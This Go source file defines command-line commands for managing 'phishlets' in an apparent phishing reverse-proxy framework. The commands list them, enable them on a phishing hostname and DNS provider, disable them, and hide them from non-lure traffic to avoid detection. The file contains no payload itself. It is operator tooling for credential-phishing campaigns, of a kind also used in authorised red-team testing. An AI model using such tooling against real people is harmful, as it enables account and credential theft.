package main

import (
	"fmt"

	"github.com/spf13/cobra"
	"github.com/travisbale/mirage/sdk"
)

func newPhishletsCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "phishlets",
		Short: "Manage phishlets",
	}
	cmd.AddCommand(
		newPhishletsListCmd(),
		newPhishletsEnableCmd(),
		newPhishletsDisableCmd(),
		newPhishletsHideCmd(),
		newPhishletsUnhideCmd(),
	)
	return cmd
}

func newPhishletsListCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "list",
		Short: "List configured phishlets",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := resolveClient(cmd)
			if err != nil {
				return err
			}
			resp, err := client.ListPhishlets()
			if err != nil {
				return err
			}
			if jsonMode(cmd) {
				return printJSON(resp)
			}
			if len(resp.Items) == 0 {
				fmt.Println("No phishlets loaded.")
				return nil
			}
			rows := make([][]string, len(resp.Items))
			for i := range resp.Items {
				p := &resp.Items[i]
				rows[i] = []string{
					p.Name,
					p.Hostname,
					p.BaseDomain,
					fmtBool(p.Enabled),
					fmtBool(p.Hidden),
				}
			}
			printTable([]string{"NAME", "HOSTNAME", "DOMAIN", "ENABLED", "HIDDEN"}, rows)
			return nil
		},
	}
}

func newPhishletsEnableCmd() *cobra.Command {
	var (
		hostname    string
		dnsProvider string
	)
	cmd := &cobra.Command{
		Use:   "enable <name>",
		Short: "Enable a phishlet",
		Args:  requireOneArg,
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := resolveClient(cmd)
			if err != nil {
				return err
			}
			p, err := client.EnablePhishlet(args[0], sdk.EnablePhishletRequest{
				Hostname:    hostname,
				DNSProvider: dnsProvider,
			})
			if err != nil {
				return err
			}
			if jsonMode(cmd) {
				return printJSON(p)
			}
			fmt.Printf("Enabled %s on %s\n", p.Name, p.Hostname)
			return nil
		},
	}
	cmd.Flags().StringVar(&hostname, "hostname", "", "phishing hostname (e.g. login.phish.example.com)")
	cmd.Flags().StringVar(&dnsProvider, "dns-provider", "", "DNS provider alias")
	_ = cmd.MarkFlagRequired("hostname")
	return cmd
}

func newPhishletsDisableCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "disable <name>",
		Short: "Disable a phishlet",
		Args:  requireOneArg,
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := resolveClient(cmd)
			if err != nil {
				return err
			}
			p, err := client.DisablePhishlet(args[0])
			if err != nil {
				return err
			}
			if jsonMode(cmd) {
				return printJSON(p)
			}
			fmt.Printf("Disabled %s\n", p.Name)
			return nil
		},
	}
}

func newPhishletsHideCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "hide <name>",
		Short: "Hide a phishlet (serve blank page to non-lure traffic)",
		Args:  requireOneArg,
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := resolveClient(cmd)
			if err != nil {
				return err
			}
			p, err := client.HidePhishlet(args[0])
			if err != nil {
				return err
			}
			if jsonMode(cmd) {
				return printJSON(p)
			}
			fmt.Printf("Hidden %s\n", p.Name)
			return nil
		},
	}
}

func newPhishletsUnhideCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "unhide <name>",
		Short: "Unhide a phishlet",
		Args:  requireOneArg,
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := resolveClient(cmd)
			if err != nil {
				return err
			}
			p, err := client.UnhidePhishlet(args[0])
			if err != nil {
				return err
			}
			if jsonMode(cmd) {
				return printJSON(p)
			}
			fmt.Printf("Unhidden %s\n", p.Name)
			return nil
		},
	}
}
